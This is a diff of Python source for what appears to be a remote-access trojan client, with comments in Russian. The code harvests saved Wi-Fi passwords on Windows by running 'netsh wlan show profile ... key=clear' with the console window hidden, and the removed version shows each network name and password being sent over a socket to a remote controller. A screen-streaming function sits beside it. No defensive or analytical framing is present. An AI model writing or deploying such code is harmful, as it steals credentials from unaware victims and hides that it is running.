@@ -43,32 +43,6 @@ def screen(client_socket):
             if not data:
                 break
             client_socket.send(data)
-    # client_socket.close()
-
-    # start_client()
-
-
-# def wifi(client_socket):
-#     # Создаем запрос в командной строке netsh wlan show profiles, декодируя его по кодировке в самом ядре
-#     data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'],stderr=subprocess.DEVNULL).decode('utf-8').split('\n')
-#     # Создаем список всех названий всех профилей сети (имена сетей)
-#     Ws = [line.split(':')[1][1:-1] for line in data if "Все профили пользователей" in line]
-#     # Для каждого имени...
-#     for Wi in Ws:
-#         # ...вводим запрос netsh wlan show profile [ИМЯ_Сети] key=clear
-#         results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', Wi, 'key=clear']).decode('utf-8').split('\n')
-#         # Забираем ключ
-#         results = [line.split(':')[1][1:-1] for line in results if "Содержимое ключа" in line]
-#         # Пытаемся его вывести в командной строке, отсекая все ошибки
-#         try:
-#             time.sleep(0.3)
-#             message = f'.Имя сети: {Wi}, Пароль: {results[0]}'
-#             client_socket.send(message.encode('utf-8'))
-#         except IndexError:
-#             time.sleep(0.3)
-#             message = f'.Имя сети: {Wi}, Пароль: нету'
-#             client_socket.send(message.encode('utf-8'))
-
 def wifi(client_socket):
     # Создаем запрос в командной строке netsh wlan show profiles, декодируя его по кодировке в самом ядре
     data = subprocess.check_output(
@@ -77,12 +51,10 @@ def wifi(client_socket):
         creationflags=subprocess.CREATE_NO_WINDOW  # Убираем окно консоли
     ).decode('utf-8').split('\n')
 
-    # Создаем список всех названий всех профилей сети (имена сетей)
     Ws = [line.split(':')[1][1:-1] for line in data if "Все профили пользователей" in line]
 
     # Для каждого имени...
     for Wi in Ws:
-        # ...вводим запрос netsh wlan show profile [ИМЯ_Сети] key=clear
         results = subprocess.check_output(
             ['netsh', 'wlan', 'show', 'profile', Wi, 'key=clear'],
             stderr=subprocess.DEVNULL,
